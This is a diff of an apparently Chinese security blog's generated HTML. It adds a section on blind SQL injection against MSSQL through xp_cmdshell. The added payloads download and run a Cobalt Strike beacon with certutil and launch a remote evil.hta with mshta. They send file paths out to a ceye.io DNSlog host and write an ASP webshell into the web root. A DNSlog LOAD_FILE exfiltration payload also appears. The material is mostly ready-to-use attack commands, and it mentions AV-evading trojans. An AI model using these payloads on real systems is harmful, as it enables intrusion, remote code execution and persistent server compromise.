@@ -80,8 +80,8 @@
         <category>Web安全</category>
       </categories>
       <tags>
-        <tag>BCEL</tag>
         <tag>JAVA</tag>
+        <tag>BCEL</tag>
       </tags>
   </entry>
   <entry>
@@ -915,7 +915,7 @@
 <p>  以此类推。。。。。</p>
 <p>  如若使用的进程数超出我提出的大小，会导致进程竞争进而出现乱序输出的情况。</p>
 <p>但是单纯的多进程不会出现这个问题，初步判断是二分法大幅度的降低了对资源的调用，提高了写入临界区的频率，进而导致进程竞争，出现输出乱序，而我用的又是队列实现，需要对queue队列的锁原语<code>__init__</code> 才能解决（<del>一个猜测</del>），留个坑，以后填。</p>
-<h1 id="无回显SQL注入"><a href="#无回显SQL注入" class="headerlink" title="无回显SQL注入"></a>无回显SQL注入</h1><p>通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。先</p>
+<h1 id="基于LOAD-FILE函数的无回显SQL注入"><a href="#基于LOAD-FILE函数的无回显SQL注入" class="headerlink" title="基于LOAD_FILE函数的无回显SQL注入"></a>基于LOAD_FILE函数的无回显SQL注入</h1><p>通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。先</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>
 
 <p>查看load_file()可以读取的磁盘。</p>
@@ -930,6 +930,28 @@
 <p>因为Linux没有UNC路径这个东西，所以当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据</p>
 <p>由此Paylaod就为</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>,(查询语句),<span class="string">&#x27;.t6n089.ceye.io\\abc&#x27;</span>));</span><br></pre></td></tr></table></figure>
+
+<h1 id="基于命令执行函数的无回显SQL注入"><a href="#基于命令执行函数的无回显SQL注入" class="headerlink" title="基于命令执行函数的无回显SQL注入"></a>基于命令执行函数的无回显SQL注入</h1><p>一个MsSql<code>高权限</code>注入点，可通过<code>xp_cmdshell</code>执行命令，但是没有回显信息。</p>
+<p>因为没有回显，所以分2种方式利用。</p>
+<h2 id="远程执行方式上线"><a href="#远程执行方式上线" class="headerlink" title="远程执行方式上线"></a>远程执行方式上线</h2><p>payload</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">;exec master..xp_cmdshell <span class="string">&quot;cmd /c ping ******.dnslog.cn&quot;</span></span><br><span class="line">;exec master..xp_cmdshell <span class="string">&quot;cmd /c mshta http://192.168.1.105:8080/evil.hta&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="文件落地方式上线"><a href="#文件落地方式上线" class="headerlink" title="文件落地方式上线"></a>文件落地方式上线</h2><p>我们还可以使用以下这些文件落地方式来上线CS&#x2F;MSF，但前提是得提前准备好一个免杀的CS木马供远程下载和执行，否则也会被查杀和拦截。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Mshta/Certutil/Bitsadmin/Powershell/MpCmdRun</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">;<span class="keyword">exec</span> master..xp_cmdshell &quot;cmd /c certutil -urlcache -split -f http://192.168.1.105:8080/beacon.exe C:\ProgramData\beacon.exe&quot;</span><br><span class="line">;<span class="keyword">exec</span> master..xp_cmdshell &quot;cmd /c C:\ProgramData\beacon.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>同时此方式还可以实现外带绝对路径出来：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">;<span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;cmd /c for /r C:\ProgramData\ %i in (beacon.exe*) do certutil -urlcache -split -f http://******.ceye.io/%i&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>以上除了用<code>xp_cmdshell</code>函数还可以用<code>sp_oacreate</code>替代。</p>
+<h2 id="获取绝对路径Getshell"><a href="#获取绝对路径Getshell" class="headerlink" title="获取绝对路径Getshell"></a>获取绝对路径Getshell</h2><p>我们在实战中有时也会遇到无回显、不出网的场景，这时可以先去尝试通过404或文件报错页来获取网站的绝对路径，如果不行再去执行以下命令将找到的路径写入Web目录下，然后再去写入Webshell。</p>
+<p>payload</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">;<span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;for /r C:\ %i in (1653042293000.png*) do echo %i&gt; %i\..\path.txt&#x27;</span></span><br><span class="line">;<span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;echo ^&lt;%execute request(&quot;1&quot;)%^&gt; &gt;C:\inetpub\wwwroot\upload\shell.asp&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>或者可以通过执行以下命令在查找绝对路径的同时写入Webshell，在指定的C盘中循环查找某某文件，将找到的绝对路径保存在%i变量中，..&#x2F;是返回上级目录，如果有找到那个文件就往里边写入一个shell.asp。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="operator">/</span>r C:\ <span class="operator">%</span>i <span class="keyword">in</span> (<span class="number">1653042293000.</span>png<span class="operator">*</span>) do echo <span class="operator">^</span><span class="operator">&lt;</span><span class="operator">%</span><span class="keyword">execute</span> request(&quot;1&quot;)<span class="operator">%</span><span class="operator">^</span><span class="operator">&gt;</span> <span class="operator">&gt;</span> <span class="operator">%</span>i<span class="operator">/</span>..<span class="operator">/</span>shell.asp</span><br></pre></td></tr></table></figure>
 
 <h1 id="笛卡尔积注入"><a href="#笛卡尔积注入" class="headerlink" title="笛卡尔积注入"></a>笛卡尔积注入</h1><p>遇到不能使用括号，或者shell()函数不能使用的情况下。</p>
 <p>具体数学实现就不说了，大概就是如下图：</p>
